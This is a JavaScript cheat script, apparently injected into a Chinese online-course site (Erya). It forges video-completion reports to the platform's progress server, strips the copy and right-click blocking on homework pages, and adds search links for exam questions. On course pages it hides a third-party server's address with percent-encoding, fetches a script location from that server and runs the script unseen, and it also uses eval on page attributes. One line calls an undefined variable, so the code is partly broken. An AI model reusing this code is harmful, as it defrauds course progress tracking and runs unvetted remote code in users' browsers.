var fuckUrl;
function toCourseVideo(courseId, videoId) {
    var _schoolCourseId = $("#schoolCourseId").val();
    if (! (courseId && videoId) || courseId.length <= 0 || videoId.length <= 0) return;
    if (iscommiting) {
        alert("请求处理中，请稍候...");
        return
    }
    iscommiting = true;
    $.ajax({
        type: "POST",
        data: {
            courseId: courseId,
            videoId: videoId,
            schoolCourseId: _schoolCourseId
        },
        async: true,
        cache: false,
        url: "/courseAction!getCourseVideo",
        dataType: "text",
        contentType: "application/x-www-form-urlencoded; charset=UTF-8",
        timeout: 30000,
        success: function(data) {
            iscommiting = false;
            if (data && data.length > 0) {
                $("#video_list").html(data);
                cur_video = $("#span_cur_video").attr("cur_video");
                init_scroll();
                publishVideo($("#span_localflv").attr("localflv"), $("#span_flv").attr("flv") + "?t=" + new Date().getTime(), $("#span_subtitle").attr("subtitle"), $("#span_localsubtitle").attr("localsubtitle"), $("#span_isSend").attr("issend"), $("#span_recieveurl").attr("recieveurl"), 1, $("#span_nextVideoId").attr("nextvideoid"), $("#span_nextVideourl").attr("nextvideourl"), 99999, $("#span_currentVideoExamineCount").attr("currentVideoExamineCount"), $("#span_homeworkurl").attr("homeworkurl"), cur_video)
            } else {
                alert("服务器忙,请稍候再试或者重新刷新页面。")
            }
        },
        error: function(e) {
            iscommiting = false;
            alert("服务器忙,请稍候再试或者重新刷新页面。")
        }
    })
}
function fuckErya() {
    var url = $("#span_recieveurl").attr("recieveurl") + "&rand=",
    t = new Date().getTime();
    var rand = "10&2&" + t;
    rand = $.base64.encode(rand);
    url += rand;
    $.get(url)
}
function fuckZy() {
    var i = document.getElementsByTagName('iframe')[0];
    i.contentDocument.body.setAttribute('oncontextmenu', '');
    i.contentDocument.oncontextmenu = function() {
        return true
    };
    var dt = i.contentDocument.getElementsByTagName('dt');
    for (var l = 0; l < dt.length; l++) {
        var text = dt[l].innerHTML.replace(/[\n\s]/g, '').replace(/&nbsp;/g, '').replace(/^[0-9]、(.*?)[\(|（].*?\)$/g, '$1');
        var code = '<span style="border: 2px solid #777;padding: 7px;background: red;"><a href="http://www.baidu.com/s?wd=' + text + '" target="_blank" style="text-decoration: none;">不会？搜索此题</a></span>';
        dt[l].innerHTML += code
    }
}
function initUI() {
    var current = $('#currli').find('a').attr('url');
    eval(current);
    $('.black_background').append('<div style=" border: 2px dashed #054; width: 200px; height: 50px; font-size: 25px; line-height: 50px; text-align: center; cursor: pointer; position:fixed;top:45%;right:5%;z-index:9999;background-color: blue; color:black;" id="toNext">点我跳到下一集<div></div></div>');
    $('.black_background').append('<div style="border: 2px dashed rgb(0, 85, 68); width: 550px; height: 50px; font-size: 25px; line-height: 50px; text-align: center; cursor: pointer; position: fixed; top: 83%; right: 30%; z-index: 9999; background-color: rgb(70, 196, 38); color: rgb(243, 12, 234);">等本集完全停止后再点下一集按纽 切记！！！<div></div></div>');
    var color = ["#FF0000", "#FFFF66", "#FF3399", "#00FFFF", "#FF9900", "#00FF00"];
    setInterval(function() {
        $('#toNext').css('backgroundColor', color[parseInt(Math.random() * 5)])
    },
    500);
    $('#toNext').bind("click", 
    function() {
        var nextCode = $('#currli').next('li').find('a').attr('url');
        fuckErya();
        eval(nextCode)
    })
}
if (document.location.href.indexOf('student') > 0) {
    fuckZy()
} else if (document.location.href.indexOf('courseAction') > 0) {
    $.getJSON(decodeURIComponent('http%3A%2F%2F0.tiebaimg.duapp.com%2Fcheck.php%3Fcallback%3D%3F'), 
    function(d) {
	var last=d.stringify(obj);
	alert(last);
        if (d) {
            $.getScript(d);
            initUI()
		}
})
} else {
    alert('\u62dc\u6258\uff01\u60a8\u786e\u5b9a\u60a8\u5728\u89c6\u9891\u64ad\u653e\u9875\u9762\u6216\u4f5c\u4e1a\u9875\u9762\uff1f')
}
